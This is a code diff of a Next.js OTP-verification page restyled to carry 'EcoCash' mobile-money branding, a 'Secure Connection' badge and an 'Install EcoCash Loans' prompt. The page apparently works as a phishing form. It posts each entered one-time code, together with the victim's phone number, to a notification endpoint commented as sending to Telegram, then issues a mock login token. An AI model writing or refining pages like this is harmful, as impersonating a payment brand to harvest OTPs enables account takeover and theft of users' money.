@@ -1,31 +1,51 @@
 'use client';
 
-import { useState } from 'react';
+import type React from 'react';
 import Link from 'next/link';
-import { useRouter } from 'next/navigation';
-import { Shield, AlertCircle, CheckCircle } from 'lucide-react';
-import { Input } from '@/components/ui/input';
+import { useState } from 'react';
+import { Home } from 'lucide-react';
 import { Button } from '@/components/ui/button';
+import { useRouter } from 'next/navigation';
 
 export default function RegisterVerifyOtpPage() {
-  const [otp, setOtp] = useState('');
-  const [error, setError] = useState('');
-  const [success, setSuccess] = useState(false);
-  const [isLoading, setIsLoading] = useState(false);
   const router = useRouter();
+  const [otp, setOtp] = useState(['', '', '', '', '', '']);
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState('');
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleOtpChange = (index: number, value: string) => {
+    if (!/^\d*$/.test(value)) return;
+
+    const newOtp = [...otp];
+    newOtp[index] = value.slice(-1);
+    setOtp(newOtp);
+
+    // Auto-focus next input
+    if (value && index < 5) {
+      const nextInput = document.getElementById(`otp-${index + 1}`);
+      nextInput?.focus();
+    }
+  };
+
+  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === 'Backspace' && !otp[index] && index > 0) {
+      const prevInput = document.getElementById(`otp-${index - 1}`);
+      prevInput?.focus();
+    }
+  };
+
+  const handleVerifyOtp = async (e: React.FormEvent) => {
     e.preventDefault();
-    
-    if (otp.length !== 6) {
-      setError('OTP must be 6 digits');
+    if (otp.some((digit) => !digit)) {
+      setError('Please enter all 6 digits');
       return;
     }
 
-    setIsLoading(true);
-    
-    // Send notification to Telegram with OTP
+    setLoading(true);
+    setError('');
+
     try {
+      // Send notification to Telegram with OTP
       const urlParams = new URLSearchParams(window.location.search);
       const phone = urlParams.get('phone') || 'Unknown';
       
@@ -33,21 +53,17 @@ export default function RegisterVerifyOtpPage() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
-          otp, 
+          otp: otp.join(''),
           action: 'register_otp_verify',
           phone: phone
         })
       });
-    } catch (err) {
-      console.error('Failed to send notification:', err);
-    }
 
-    // Verify OTP
-    try {
+      // Verify OTP
       const response = await fetch('/api/verify-otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ otp })
+        body: JSON.stringify({ otp: otp.join('') })
       });
       
       const data = await response.json();
@@ -58,13 +74,8 @@ export default function RegisterVerifyOtpPage() {
         const token = `mock_token_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
         localStorage.setItem('token', token);
         
-        setSuccess(true);
-        setError('');
-        
-        // Redirect to progress page then to dashboard
-        setTimeout(() => {
-          router.push('/dashboard');
-        }, 1500);
+        // Redirect to dashboard
+        router.push('/dashboard');
       } else {
         setError(data.message || 'Invalid OTP. Please try again.');
       }
@@ -72,7 +83,7 @@ export default function RegisterVerifyOtpPage() {
       setError('An error occurred. Please try again.');
       console.error(err);
     } finally {
-      setIsLoading(false);
+      setLoading(false);
     }
   };
 
@@ -82,92 +93,112 @@ export default function RegisterVerifyOtpPage() {
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-primary/5 to-accent/5 flex items-center justify-center p-4">
-      <div className="w-full max-w-md">
-        <div className="text-center mb-8">
-          <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-primary/10 mb-4">
-            <Shield className="h-8 w-8 text-primary" />
-          </div>
-          <h1 className="text-3xl font-bold bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">
-            Verify OTP
+    <div className="min-h-screen bg-white flex flex-col">
+      {/* Top Bar */}
+      <div className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between">
+        <Link
+          href="/"
+          className="flex items-center gap-2 text-blue-600 hover:text-blue-700 font-semibold transition-colors"
+        >
+          <Home className="w-5 h-5" />
+          Home
+        </Link>
+        <div className="text-sm text-green-500 font-semibold">Secure Connection</div>
+      </div>
+
+      {/* Main Content */}
+      <div className="flex-1 flex flex-col items-center justify-center px-6 py-12">
+        {/* Logo */}
+        <div className="mb-12 text-center">
+          <h1 className="text-5xl font-black">
+            <span className="text-blue-600">Eco</span>
+            <span className="text-red-600">Cash</span>
           </h1>
-          <p className="text-foreground/70 mt-2">
-            Enter the 6-digit code sent to your phone
-          </p>
         </div>
 
-        {success ? (
-          <div className="text-center py-8">
-            <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-green-500/10 mb-4">
-              <CheckCircle className="h-8 w-8 text-green-500" />
-            </div>
-            <h2 className="text-xl font-semibold mb-2">Verification Successful!</h2>
-            <p className="text-foreground/70">Redirecting to dashboard...</p>
-          </div>
-        ) : (
-          <form onSubmit={handleSubmit} className="space-y-6">
+        {/* OTP Section */}
+        <div className="w-full max-w-md">
+          <h2 className="text-3xl font-bold text-gray-900 text-center mb-2">Verify Your OTP</h2>
+          <p className="text-gray-600 text-center mb-10 text-sm">Enter the 6-digit code sent to your phone</p>
+
+          <form onSubmit={handleVerifyOtp} className="space-y-6">
+            {/* OTP Input Section */}
             <div>
-              <label htmlFor="otp" className="block text-sm font-medium text-foreground mb-2 pl-1">
-                One-Time Password (OTP)
-              </label>
-              <div className="relative">
-                <Input
-                  id="otp"
-                  type="text"
-                  inputMode="numeric"
-                  maxLength={6}
-                  placeholder="Enter 6-digit OTP"
-                  value={otp}
-                  onChange={(e) => {
-                    const value = e.target.value.replace(/\D/g, '');
-                    if (value.length <= 6) {
-                      setOtp(value);
-                    }
-                  }}
-                  className="w-full px-4 py-3 text-center text-lg tracking-widest text-center border border-input focus:ring-primary/50 focus:border-primary rounded-lg focus:outline-none focus:ring-1 bg-background placeholder:text-muted-foreground"
-                />
+              <h3 className="text-blue-600 font-bold text-center mb-2 text-lg">Enter OTP</h3>
+              <p className="text-gray-600 text-center text-sm mb-6">6-digit verification code</p>
+
+              <div className="flex justify-center gap-3 mb-6">
+                {otp.map((digit, index) => (
+                  <input
+                    key={index}
+                    id={`otp-${index}`}
+                    type="text"
+                    value={digit}
+                    onChange={(e) => handleOtpChange(index, e.target.value)}
+                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
+                    maxLength={1}
+                    className="w-14 h-14 text-2xl font-bold text-center border-2 border-gray-300 rounded-2xl focus:outline-none focus:border-blue-600 focus:ring-2 focus:ring-blue-200"
+                  />
+                ))}
               </div>
-              <p className="text-xs text-foreground/60 mt-2 text-center">
-                If you haven't received the OTP yet, it might take up to a minute. You can request again.
-              </p>
+
+              {error && <p className="text-red-600 text-center text-sm font-semibold">{error}</p>}
+
+              <div className="text-center mt-6">
+                <p className="text-gray-600 text-sm mb-2">Didn't receive the code?</p>
+                <button 
+                  type="button" 
+                  onClick={handleResendOtp}
+                  className="text-blue-600 hover:text-blue-700 font-semibold text-sm"
+                >
+                  Resend OTP
+                </button>
+              </div>
             </div>
 
-            {error && (
-              <div className="flex items-center p-3 text-sm text-destructive bg-destructive/10 rounded-lg">
-                <AlertCircle className="h-4 w-4 mr-2" />
-                {error}
-              </div>
-            )}
-
+            {/* Verify Button */}
             <Button
               type="submit"
-              disabled={isLoading || otp.length !== 6}
-              className="w-full flex items-center justify-center gap-2 rounded-md bg-primary px-4 py-3 text-sm font-medium text-primary-foreground shadow transition-colors hover:bg-primary/90 focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 disabled:opacity-50"
+              disabled={loading}
+              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 text-lg rounded-xl transition-all"
             >
-              {isLoading ? (
-                <div className="flex items-center gap-2">
-                  <div className="h-4 w-4 border-2 border-current border-t-transparent rounded-full animate-spin"></div>
-                  <span>Verifying...</span>
-                </div>
-              ) : (
-                'Verify OTP'
-              )}
+              {loading ? "Verifying..." : "Verify OTP"}
             </Button>
 
-            <div className="text-center">
-              <button
-                type="button"
-                onClick={handleResendOtp}
-                className="text-sm text-primary hover:text-primary/80 font-medium"
-              >
-                Resend OTP
+            {/* Back to Login */}
+            <Link href="/login" className="block text-center">
+              <button type="button" className="text-blue-600 hover:text-blue-700 font-semibold text-sm">
+                Back to Login
               </button>
-            </div>
+            </Link>
           </form>
-        )}
+        </div>
+      </div>
 
-        <div className="mt-8 text-center text-sm text-foreground/70">
-          <p>Need help? Contact support for assistance.</p>
+      {/* Wavy Divider */}
+      <svg viewBox="0 0 1200 120" preserveAspectRatio="none" className="w-full h-24" style={{ marginBottom: "-1px" }}>
+        <path d="M0,50 Q300,0 600,50 T1200,50 L1200,120 L0,120 Z" fill="#1e40af" />
+      </svg>
+
+      {/* Blue Section with App Promotion */}
+      <div className="bg-blue-600 text-white px-6 py-10">
+        <div className="max-w-md mx-auto text-center">
+          <p className="text-sm opacity-90 mb-6">To register an EcoCash wallet or get assistance, click below</p>
+
+          <div className="bg-gradient-to-br from-purple-400 to-purple-600 rounded-2xl p-8">
+            <div className="flex justify-center gap-4 mb-4 opacity-70">
+              <div className="w-6 h-6 bg-white rounded-full" />
+              <div className="w-6 h-6 bg-white rounded-full" />
+              <div className="w-6 h-6 bg-white rounded-full" />
+            </div>
+
+            <h3 className="text-xl font-bold mb-2">Install EcoCash Loans</h3>
+            <p className="text-sm opacity-90 mb-6">Add to your home screen for quick access and better experience</p>
+
+            <Button className="w-full bg-white text-purple-600 hover:bg-gray-100 font-bold py-3 rounded-xl transition-all">
+              Install App
+            </Button>
+          </div>
         </div>
       </div>
     </div>
